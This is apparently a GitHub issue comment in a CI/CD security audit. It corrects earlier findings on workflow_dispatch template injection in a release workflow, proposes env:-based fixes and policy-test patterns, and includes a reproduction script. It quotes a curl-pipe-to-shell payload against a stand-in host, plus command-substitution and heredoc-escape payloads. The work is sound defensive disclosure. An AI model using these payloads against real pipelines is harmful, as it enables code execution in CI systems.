Measured the four `template-injection` sites this issue lists, and **two of them do not execute as described above** — the description in the body ("A `workflow_dispatch` description of `x"; curl -sSf https://example.test/p | sh; echo "` runs as its own command") is right for `release.yml:616` and `:617` and wrong for `:767` and `:770`. Correcting that here rather than leaving it, because the whole point of the audit is that a finding has to mean what it says.

### What the difference is

`:767` and `:770` are inside a **quoted** heredoc:

```yaml
      - name: Create changeset file          # release.yml:758
        run: |
          …
          cat > "$CHANGESET_FILE" << 'EOF'
          ---
          'MyPackage': ${{ github.event.inputs.bump_type }}
          ---

          ${{ github.event.inputs.description || 'Manual release' }}
          EOF
```

With `<< 'EOF'` the shell performs no expansion at all inside the body, so `$( )`, a backtick and `x"; …; echo "` are written to the changeset file as text. The runner's substitution still happens — the value is still in the script — but the shell never evaluates it.

Measured, whole `run:` block substituted and executed exactly as the runner writes it, with stub tools on `PATH` and a payload that proves execution by writing a file:

```
### csharp @ 83efb9e4 -- layer 1, the workflow expansion
  REPRODUCED  csharp release.yml:613 (interpolated at 616,617) (cmdsub)
  inert       csharp release.yml:759 (interpolated at 767,770) (cmdsub)
  REPRODUCED  csharp release.yml:613 (interpolated at 616,617) (heredoc)
  REPRODUCED  csharp release.yml:759 (interpolated at 767,770) (heredoc)
```

`cmdsub` is the payload `$(printf INJECTED >> "$proof")`. `heredoc` is a newline, a line reading `EOF`, then the same `$( )` — which closes the heredoc and puts the rest of the payload back on the shell's command level. So the heredoc site **is** reachable, but only with a value containing a newline, and only because the delimiter is a fixed, guessable `EOF`.

This correction cuts both ways, and neither half is comfortable:

- The claim "quoting inside the script does not help" is too strong for these two sites. It is exactly right for `:616`/`:617`, where the value sits inside double quotes on a command line and `$( )` expands regardless.
- The heredoc is not a mitigation either. It rests on the value being single-line, which nothing enforces: the `inputs` payload limit is [documented in characters, not lines](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows) ("The maximum payload for `inputs` is 65,535 characters"), the single-line text box is a UI affordance rather than a validation, and the API takes the value as a JSON string. What we did **not** manage to establish is delivery: both probe dispatches were rejected on the `choice` before the API formed any opinion about the description, so "a newline reaches the expansion" is untested and the heredoc half should be read as conditional.
- Even with no newline at all, both heredoc sites are still defects, just different ones: the value lands verbatim in the changeset body, which the release path then prints to the log — and an unbracketed print of `##[error]…` is a live workflow command, because the runner's `ActionCommand.TryParse` accepts `##[` anywhere in a physical line. That is filed separately as the log-injection report.

### What we also measured about `bump_type`

`bump_type` and `release_mode` are `choice` inputs, and GitHub validates a choice server-side:

```console
$ gh api -X POST repos/<owner>/<repo>/actions/workflows/release.yml/dispatches \
    -f ref=<branch> -f 'inputs[release_mode]=definitely-not-an-option' …
{"message":"Provided value 'definitely-not-an-option' for input 'release_mode' not in the list of allowed values","status":"422"}
```

No run is created. So of the four findings, the two that are live through an unvalidated value are `:617` (`description`, on a command line) and `:770` (`description`, in the heredoc, conditional on a newline); `:616` and `:767` take the validated `choice` and are defence in depth. The fix is the same for all four, and worth applying to all four — a later edit that turns a `choice` into a `string` would reintroduce the hole silently.

### The fix, for the heredoc site specifically

`env:` plus an **unquoted** heredoc, so the shell — not the runner — substitutes the value, and a newline in it stays inside the body:

```diff
       - name: Create changeset file
+        env:
+          BUMP_TYPE: ${{ github.event.inputs.bump_type }}
+          DESCRIPTION: ${{ github.event.inputs.description || 'Manual release' }}
         run: |
           …
-          cat > "$CHANGESET_FILE" << 'EOF'
+          cat > "$CHANGESET_FILE" << EOF
           ---
-          'MyPackage': ${{ github.event.inputs.bump_type }}
+          'MyPackage': ${BUMP_TYPE}
           ---
 
-          ${{ github.event.inputs.description || 'Manual release' }}
+          ${DESCRIPTION}
           EOF
```

An unquoted heredoc does expand `$( )` in the *body text of the script* — but the body text is now fixed, and `$DESCRIPTION` is a variable expansion, which is not re-parsed. If keeping `<< 'EOF'` matters, write the two values with `printf '%s\n' "$DESCRIPTION" >> "$CHANGESET_FILE"` instead; either way the value stops being script.

### One more thing, in this repository's own idiom

`scripts/workflow-injection-policy.test.mjs` already walks every `run:` block of every workflow and fails on any expression matching `UNTRUSTED_CONTEXTS`. That list covers `github.head_ref`, PR titles and bodies, commit messages and `workflow_run.head_branch` — and not `inputs`. Two patterns close the gap and turn this issue into a red check:

```diff
 const UNTRUSTED_CONTEXTS = [
   /github\.head_ref/,
+  // A `type: string` workflow_dispatch input is validated by nothing, and a
+  // `choice` is validated by GitHub rather than by this workflow's contract.
+  /github\.event\.inputs\.\w+/,
+  /\binputs\.\w+/,
```

Worth noting what that costs: the test would then also flag the heredoc sites, which — per the measurement above — are content injection rather than execution until a newline arrives. That is the right trade for a policy assertion, as long as the policy is stated as "an untrusted value may not appear in script text" rather than as "this line executes".

Found while auditing every CI/CD false positive and false negative in `link-foundation/box` ([box#123](https://github.com/link-foundation/box/issues/123)), which compares this template's full workflow and script tree against ours. The `go` and `java` templates have the same defect and had no report; they are filed as [go#8](https://github.com/link-foundation/go-ai-driven-development-pipeline-template/issues/8) and [java#8](https://github.com/link-foundation/java-ai-driven-development-pipeline-template/issues/8). The `rust` template fixed it in rust#111 and its `release.yml:1163-1167` is the shape to copy.

### The fixture, so this is runnable without cloning `box`

<details>
<summary><code>experiments/issue-123/repro-dispatch-description-injection.sh</code></summary>

```bash
#!/usr/bin/env bash
# Reproduce: a workflow_dispatch input is pasted straight into a `run:` body,
# and (in the C# template) from there into a shell command built by string
# concatenation that escapes only the double quote.
#
# GitHub expands `${{ ... }}` by textual substitution *before* the shell parses
# the line, so an input containing `$(...)`, a backtick or a newline is not an
# argument -- it is code. The same input read through `env:` is inert, because
# the shell expands a variable after parsing it.
#
# Three layers are reproduced:
#   layer 1  the workflow expansion, by substituting a payload into the real
#            `run:` block exactly as the runner would -- the *whole* block,
#            dedented as YAML dedents it, with stub tools on PATH so nothing
#            real runs. Two payloads are tried per block:
#              cmdsub    `$(...)`, which needs the interpolation to sit where
#                        the shell performs expansion;
#              heredoc   a newline, a line reading `EOF`, and then `$(...)`,
#                        which is what it takes to escape a *quoted* heredoc
#                        (`<< 'EOF'`), where the shell expands nothing. The API
#                        accepts newlines in a `type: string` dispatch input.
#   layer 2  the C# script's own escaping, by calling the same
#            execSync(`git commit -m "${msg.replace(/"/g, '\"')}"`) shape from
#            scripts/version-and-commit.mjs:412 with a stub `git`.
#
# Why the whole block and not the interpolated line: an earlier version of this
# script substituted into single lines and ran each one on its own. That reports
# a quoted heredoc as injectable, because the line taken out of its heredoc is
# an ordinary command line -- a false positive of exactly the kind this audit is
# about. Running the block keeps the context that decides the answer.
#
# Usage:
#   bash experiments/issue-123/repro-dispatch-description-injection.sh TEMPLATE_DIR...
# where each TEMPLATE_DIR is a checkout of one of the
# link-foundation/*-ai-driven-development-pipeline-template repositories.
set -uo pipefail

work="$(mktemp -d)"
trap 'rm -rf "${work}"' EXIT
mkdir -p "${work}/bin" "${work}/blocks"

# Stubs: the payload must be the only thing that can write the proof file.
for tool in bun npm node git gh mvn dotnet go cargo rust-script; do
  printf '#!/bin/sh\nexit 0\n' >"${work}/bin/${tool}"
  chmod +x "${work}/bin/${tool}"
done

proof="${work}/proof"
reproduced=0
checked=0
blocked=0

# Extract every `run:` block of a workflow, dedented, one file per block, and
# print `startline<TAB>path<TAB>interpolated-lines` for the blocks that
# interpolate a dispatch input. The payload is substituted here, so the file is
# exactly what the shell would receive.
emit_blocks() {
  WF="$1" OUT="$2" PAYLOAD="$3" python3 - <<'PY'
import os
import re

wf = os.environ["WF"]
out = os.environ["OUT"]
payload = os.environ["PAYLOAD"]

INPUT_RE = re.compile(r"\$\{\{[^}]*inputs\.(?:description|bump_type)[^}]*\}\}")
OTHER_RE = re.compile(r"\$\{\{[^}]*\}\}")

lines = open(wf, encoding="utf-8").read().split("\n")


def indent_of(line):
    stripped = line.lstrip(" ")
    return len(line) - len(stripped)


blocks = []  # (startline, [(lineno, text)])
i = 0
while i < len(lines):
    line = lines[i]
    # Block scalar: `run: |`, `run: >-`, ...
    if re.match(r"^[ ]*-?[ ]*run:[ ]*[|>][-+]?[ ]*$", line):
        keyindent = indent_of(line)
        body = []
        j = i + 1
        while j < len(lines):
            if lines[j].strip() == "":
                body.append((j + 1, ""))
                j += 1
                continue
            if indent_of(lines[j]) <= keyindent:
                break
            body.append((j + 1, lines[j]))
            j += 1
        # YAML strips the block's common indentation.
        widths = [indent_of(t) for _, t in body if t.strip()]
        strip = min(widths) if widths else 0
        blocks.append((i + 1, [(n, t[strip:] if t.strip() else "") for n, t in body]))
        i = j
        continue
    # Inline form: `run: <command>`
    m = re.match(r"^([ ]*-?[ ]*run:[ ]+)([^|>].*)$", line)
    if m:
        blocks.append((i + 1, [(i + 1, m.group(2))]))
    i += 1

records = []
for start, body in blocks:
    hits = [n for n, t in body if INPUT_RE.search(t)]
    if not hits:
        continue
    text = "\n".join(t for _, t in body) + "\n"
    text = INPUT_RE.sub(lambda _: payload, text)
    # Every other expression is substituted with a benign literal, which is also
    # what the runner does before the shell sees the line. `.` keeps the paths
    # these blocks build valid.
    text = OTHER_RE.sub(".", text)
    path = os.path.join(out, "block-%d.sh" % start)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(text)
    records.append("%d\t%s\t%s" % (start, path, ",".join(str(n) for n in hits)))

print("\n".join(records))
PY
}

try_block() {
  local label="$1" script="$2" kind="$3"
  : >"${proof}"
  (cd "${work}" && PATH="${work}/bin:${PATH}" bash "${script}") >/dev/null 2>&1
  if [ -s "${proof}" ]; then
    echo "  REPRODUCED  ${label} (${kind})"
    reproduced=$((reproduced + 1))
    return 0
  fi
  return 1
}

for dir in "$@"; do
  name="$(basename "${dir}")"
  wf="${dir}/.github/workflows/release.yml"
  [ -f "${wf}" ] || continue
  echo "### ${name} @ $(cd "${dir}" && git rev-parse --short=8 HEAD) -- layer 1, the workflow expansion"
  found=0
  for kind in cmdsub heredoc; do
    case "${kind}" in
      cmdsub) payload='$(printf INJECTED >> '"${proof}"')' ;;
      heredoc) payload="$(printf '\nEOF\n$(printf INJECTED >> %s)\n' "${proof}")" ;;
    esac
    out="${work}/blocks/${name}-${kind}"
    mkdir -p "${out}"
    while IFS=$'\t' read -r start script hits; do
      [ -n "${start:-}" ] || continue
      found=1
      [ "${kind}" = cmdsub ] && checked=$((checked + 1))
      try_block "${name} release.yml:${start} (interpolated at ${hits})" "${script}" "${kind}" \
        || {
          [ "${kind}" = heredoc ] && continue
          echo "  inert       ${name} release.yml:${start} (interpolated at ${hits}) (cmdsub)"
          blocked=$((blocked + 1))
        }
    done < <(emit_blocks "${wf}" "${out}" "${payload}")
  done
  [ "${found}" = 1 ] || echo "  (no dispatch input interpolated into a run: script)"
  echo
done

# ---------------------------------------------------------------------- layer 2
# The C# template's own escaping, driven through the real script rather than a
# re-implementation of it: scripts/version-and-commit.mjs builds
#   exec(`git commit -m "${commitMsg.replace(/"/g, '\\"')}"`)
# at :412 and the same shape for `git tag -a` at :419. Only the double quote is
# escaped, so `$( )` in the description is executed by the shell execSync starts.
# Fixing the workflow (env: + "$DESCRIPTION") does NOT fix this: the value still
# arrives on argv and is still concatenated into a command string.
csharp_dir=""
for dir in "$@"; do
  [ "$(basename "${dir}")" = csharp ] && csharp_dir="${dir}"
done

if [ -n "${csharp_dir}" ]; then
  echo "### layer 2: the C# template's own exec() escaping, driven through the real script"
  checked=$((checked + 1))
  : >"${proof}"
  fixture="${work}/csharp-exec"
  cp -r "${csharp_dir}" "${fixture}"
  # Enough git for the script to reach its commit step, and a record of what it
  # was asked to run. `git diff --cached --quiet` must report changes (exit 1)
  # and `git rev-parse --verify` must report the tag as absent.
  # A separate bin dir: layer 1's stubs include `node`, and layer 2 needs the
  # real one -- the point is to run the shipped script, not a stub of it.
  mkdir -p "${work}/bin-layer2"
  cat >"${work}/bin-layer2/git" <<'STUB'
#!/bin/sh
case "$*" in
  *"diff --cached --quiet"*) exit 1 ;;
  *"rev-parse --verify"*) exit 1 ;;
esac
printf 'git %s\n' "$*" >> "${GIT_STUB_LOG}"
exit 0
STUB
  chmod +x "${work}/bin-layer2/git"
  : >"${work}/git-stub.log"
  (cd "${fixture}" && PATH="${work}/bin-layer2:${PATH}" GIT_STUB_LOG="${work}/git-stub.log" \
    node scripts/version-and-commit.mjs --mode instant --bump-type patch \
    --description '$(printf INJECTED >> '"${proof}"')') >"${work}/csharp-exec.out" 2>&1
  echo "  script exit=$?"
  if [ -s "${proof}" ]; then
    echo "  REPRODUCED  a --description of \$(...) executed $(wc -c <"${proof}" | tr -d ' ') byte(s) worth of payload"
    echo "              (twice: once for the commit message at :412, once for the tag message at :419)"
    reproduced=$((reproduced + 1))
  else
    echo "  inert       the description did not execute"
  fi
  echo "  what the stub git was asked to run:"
  sed 's/^/    /' "${work}/git-stub.log"
fi

echo
echo "reproduced ${reproduced} payload(s) over ${checked} interpolating run: block(s); ${blocked} block(s) resisted the cmdsub payload"
[ "${reproduced}" -gt 0 ] || exit 1
```

</details>
